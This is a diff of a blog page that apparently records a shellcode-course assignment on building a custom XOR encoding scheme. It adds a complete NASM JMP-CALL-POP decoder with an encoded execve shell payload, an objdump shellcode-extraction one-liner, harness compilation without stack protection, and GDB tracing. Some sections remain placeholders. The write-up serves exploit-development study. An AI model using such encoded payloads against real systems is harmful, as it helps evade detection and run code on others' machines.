@@ -59,7 +59,7 @@
                       <article id="first-post">
 												<a href="index.html"><img src="../images/pete.png" class="avatar" alt="avatar"> </img></a>
                         <h2>&emsp; Creating a Custom Encoding Scheme</h2>
-												<h5>&emsp; &emsp; &emsp; &emsp; October 16, 2020</h5>
+												<h5>&emsp; &emsp; &emsp; &emsp; October 25, 2020</h5>
                         <div class="box">
 
 													<br><h2>Contents</h2>
@@ -187,18 +187,77 @@ decoder:
 call_shellcode:
 	call decoder
 	; spaces added after commas for readability
-THIS IS WRONG ENCODED PAYLOAD
 	EncodedShellcode: db 0x15, 0xe4, 0x74, 0x4c, 0x0a, 0x69, 0x0b, 0x57, 0x4c, 0x4c, 0x0a, 0x69, 0x46, 0x4d, 0x4a, 0xad, 0xc6, 0x69, 0x74, 0xad, 0xc6, 0x77, 0xac, 0x69, 0xc5, 0x94, 0x2f, 0xe9, 0xa5, 0x69, 0x69, 0x69
 
 										</code>
 									</pre>
 
 									<p>
-										The above technique is called <i>JMP-CALL-POP</i>. &nbsp;It manipulates the <i>call</i> instruction in which the address of the next instruction is pushed onto the stack. &nbsp;This comes in
-										handy when accessing data and its address is unknown.
+										The above technique is called <i>JMP-CALL-POP</i>. &nbsp;It manipulates the <i>call</i> instruction in which the address of the next instruction (EIP value) is pushed onto the stack. &nbsp;This comes in
+										handy when accessing data and its address is unknown. &nbsp;Specific information on the <i>call</i> instruction can be found
+										<a href="https://c9x.me/x86/html/file_module_x86_id_26.html" target="_blank" style="color:blue;">here</a> and in the screenshot below (from the same page).
 									</p>
-									<center><div class="image post"><img src="../images/slae/assignment4/.png" alt="" /></div></center><br>
+									<center><div class="image post"><img src="../images/slae/assignment4/3-call-instruction.png" alt="" /></div></center><br>
 
+
+									<p>
+										The final code is below
+									</p>
+									<pre>
+										<code class="x86asm" style=display:block;white-space:pre-wrap>
+global _start
+
+section .text
+
+_start:
+
+	jmp short call_shellcode
+
+decoder:
+	pop esi				; esi = EncodedShellcode
+	lea edi, [esi]			; edi moves along shellcode length
+	xor eax, eax
+	mov al, 6			; eax = 6 set-of-six counter
+	xor ebx, ebx			; ebx = 0
+	xor ecx, ecx			; normal byte counter = 0. start at index 0
+
+
+decode:
+	; check for end of EncodedShellcode. Hence the XOR with 0x69
+	mov bl, byte [esi]		; bl = first byte of EncodedShellcode
+	xor bl, 0x69			; check if bl = 0x69
+	jz short EncodedShellcode	; jump to EncodedShellcode if end is reached because it's decoded!
+
+next:
+	; Need to decode first 5 bytes before running through any movement stuff
+	; Movement handled simultaneously for brevity
+	cmp ecx, 4			; is the 5th byte reached?
+	jnz Normal			; do XOR 0x24 for first four bytes
+	mov bl, byte [esi + ecx]	; load 5th byte into bl
+	xor bl, 0x25			; XOR 0x25 for 5th byte
+	mov byte [edi], bl		; store decoded byte into edi location
+	xor ecx, ecx			; 5th byte is reached. Reset to 0
+	inc edi				; edi points to next address of shellcode
+	add esi, 6
+	jmp short decode		; go to end-of-shellcode checking instructions
+
+Normal:
+	mov bl, byte [esi + ecx]	; load byte into bl
+	xor bl, 0x24			; do XOR 0x24 for first 4 bytes
+	mov byte [edi], bl		; store decoded byte into edi location
+	inc edi				; edi points to next address of shellcode
+	inc ecx				; counter + 1
+	jmp short next			; decode next byte
+
+
+call_shellcode:
+	call decoder
+	;EncodedShellcode: db &lt;encoded execve-stack code>
+	EncodedShellcode: db 0x15,0xe4,0x74,0x4c,0x0a,0x69,0x0b,0x57,0x4c,0x4c,0x0a,0x69,0x46,0x4d,0x4a,0xad,0xc6,0x69,0x74,0xad,0xc6,0x77,0xac,0x69,0xc5,0x94,0x2f,0xe9,0xa5,0x69, 0x69, 0x69
+
+
+										</code>
+									</pre>
 
 
 
@@ -208,36 +267,106 @@ THIS IS WRONG ENCODED PAYLOAD
 									<!-- Compiling 32-bit executables on 64-bit Linux:
 									nasm command works fine.
 									add i386 option to ld: ld -m elf_i386 -z execstack -o execve-stack execve-stack.o
+
+
+									Never forget objdump special command:
+
+									objdump -d ./PROGRAM|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
 								 -->
 									<p>
-										&emsp; &emsp;Demonstrate shellcode here
+										&emsp; &emsp;After writing the assembly, the <i>-N</i> option must be added to the linker to enable write access to the <i>.text</i> section. &nbsp;Without it, the program
+										reaches a SEGFAULT error when storing the first decoded byte into <i>[edi]</i>; specifically at <code>mov byte [edi], bl</code>
 									</p>
-									<center><div class="image post"><img src="../images/slae/assignment4/.png" alt="" /></div></center><br>
+									<center><div class="image post"><img src="../images/slae/assignment4/4-compiled-decoder.png" alt="" /></div></center><br>
+
+									<p>
+										Confirm successful operation of <i>decoder.nasm</i>! &nbsp;\o/
+									</p>
+									<center><div class="image post"><img src="../images/slae/assignment4/decoder-strace.gif" alt="" /></div></center><br>
+
+									<p>
+										Perform a quick optimization by checking for dead bytes. &nbsp;Luckily none exist.
+									</p>
+									<center><div class="image post"><img src="../images/slae/assignment4/5-no-dead-bytes.png" alt="" /></div></center><br>
+
+									<p>
+										Extract the shellcode with the special <i>objdump</i>
+									 <a href="https://www.commandlinefu.com/commands/view/6051/get-all-shellcode-on-binary-file-from-objdump" target="_blank" style="color:blue;">command</a>. &nbsp;Be sure
+									 to tweak the second <i>cut</i> instruction to <code>cut -f1-7 -d' '</code> to grab up to 7 bytes at a time if needed.
+									</p>
+									<center><div class="image post"><img src="../images/slae/assignment4/6-get-shellcode.png" alt="" /></div></center><br>
+
+									<p>
+										Copy and paste the shellcode into <i>harness.c</i>. &nbsp;
+									</p>
+									<center><div class="image post"><img src="../images/slae/assignment4/7-harness-paste.png" alt="" /></div></center><br>
+
+									<p>
+										Compile <i>harness.c</i> without stack protection and an executable stack. &nbsp;Run the binary to confirm a running shell! &nbsp;\o/
+									</p>
+									<center><div class="image post"><img src="../images/slae/assignment4/8-harness-works.png" alt="" /></div></center><br>
 
 
 
 			<br><section id="GDB"><h2>GDB Analysis</h2></section>
-
-									<p>
-										&emsp; &emsp;Analyze shellcode in GDB
-
 										<!--
 										* Show initial encoded payload and how it looks like gibberish.
 										* Step through decoder program in harness or compiled decoder.nasm to show how payload is slowly decoded
 										* Show final payload after decoding
 										* jump to edi!
-
-									 -->
+		 							-->
+									<p>
+										&emsp; &emsp;Activity can be inspected in <i>GDB</i>. &nbsp;Open the decoder binary in <i>GDB</i> with <code>gdb -q ./decoder</code> and perform the usual
+										setup commands: <i>set disassembly-flavor intel</i>, <i>break _start</i>, <i>run</i>. &nbsp;Then dump the endoded payload with the <i>disassemble</i>
+										command below.
 									</p>
-									<center><div class="image post"><img src="../images/slae/assignment2/.png" alt="" /></div></center><br>
+									<center><div class="image post"><img src="../images/slae/assignment4/9-encoded-payload.png" alt="" /></div></center><br>
+
+									<p>
+										Set a breakpoint at the <code>jz short EncodedShellcode</code> instruction and continue up to the point where <code>xor bl, 0x69</code> equals zero. &nbsp;<i>GDB</i> decompiles this
+										to a slightly different instruction but is functionally the same. &nbsp;Notice the end of <i>EncodedShellcode</i> is reached when 40 bytes of <i>esi</i> are dumped. &nbsp;The
+										<i>hook-stop</i> used is:
+									</p>
+									<pre>
+										<code style=display:block;white-space:pre-wrap>
+(gdb) define hook-stop
+Type commands for definition of "hook-stop".
+End with a line saying just "end".
+>print/x $eax
+>print/x $ebx
+>print/x $esi
+>print/x $edi
+>disassemble
+>end
+(gdb)
+										</code>
+									</pre>
+									<center><div class="image post"><img src="../images/slae/assignment4/10-pre-jump.png" alt="" /></div></center><br>
+
+									<p>
+										Step one last time to jump into the address pointed by <i>EncodedShellcode</i>. &nbsp;The payload is successfully decoded into <i>execve-stack</i> instructions
+										shown earlier!
+									</p>
+									<center><div class="image post"><img src="../images/slae/assignment4/11-decoded-payload.png" alt="" /></div></center><br>
+
+
+
+
+
+
+
 
 
 			<br><section id="Debugging"><h2>Debugging</h2></section>
 
+									<!--
+
+									-->
 									<p>
-										&emsp; &emsp;What problems were encountered?
+										&emsp; &emsp;This assignment contained mostly logical errors that lead to things like SEGFAULT and an obscure error: <i>Trace/breakpoint trap (core dumped)</i>.
+										 &nbsp;
 									</p>
-									<center><div class="image post"><img src="../images/slae/assignment2/.png" alt="" /></div></center><br>
+									<center><div class="image post"><img src="../images/slae/assignment4/.png" alt="" /></div></center><br>
 
 
 
@@ -245,9 +374,9 @@ THIS IS WRONG ENCODED PAYLOAD
 		<br><section id="Thoughts"><h2>Thoughts and Lessons Learned</h2></section>
 
 									<p>
-										&emsp; &emsp;Conclusion goes here
+										&emsp; &emsp;Conclusion goes here &nbsp;
 									</p>
-									<center><div class="image post"><img src="../images/slae/assignment2/.png" alt="" /></div></center><br>
+									<center><div class="image post"><img src="../images/slae/assignment4/.png" alt="" /></div></center><br>
 
 
 
